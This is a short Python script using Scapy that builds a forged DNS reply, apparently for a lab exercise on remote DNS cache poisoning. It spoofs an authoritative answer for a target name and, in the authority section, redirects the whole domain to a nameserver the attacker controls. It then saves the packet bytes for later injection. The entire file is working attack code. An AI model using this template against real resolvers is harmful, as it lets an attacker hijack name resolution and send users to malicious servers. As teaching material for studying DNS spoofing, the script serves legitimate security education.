#!/usr/bin/python3
from scapy.all import *

targetName = 'twysw.example.lan'
targetDomain = 'example.lan'

IPpkt = IP(src="192.168.0.6", dst="192.168.0.5", chksum=0)
UDPpkt = UDP(sport=53, dport=33333, chksum=0)

# Question section
Qdsec = DNSQR(qname=targetName)

# Answer Section, any IPs(rdata) are fine
Anssec = DNSRR(rrname=targetName, type="A", rdata="1.2.3.4", ttl=259200)

# Authority Section (main gola of the attack)
NSsec = DNSRR(rrname=targetDomain, type="NS", rdata="ns.attacker32.lan", ttl=259200)

DNSpkt = DNS(id=0xAAAA, aa=1, ra=0, rd=0, cd=0, qr=1,
                qdcount=1, ancount=1, nscount=1, arcount=0,
                qd=Qdsec, an=Anssec, ns=NSsec)

Replypkt = IPpkt/UDPpkt/DNSpkt

with open("ip_resp.bin", "wb") as f:
    f.write(bytes(Replypkt))
    Replypkt.show()
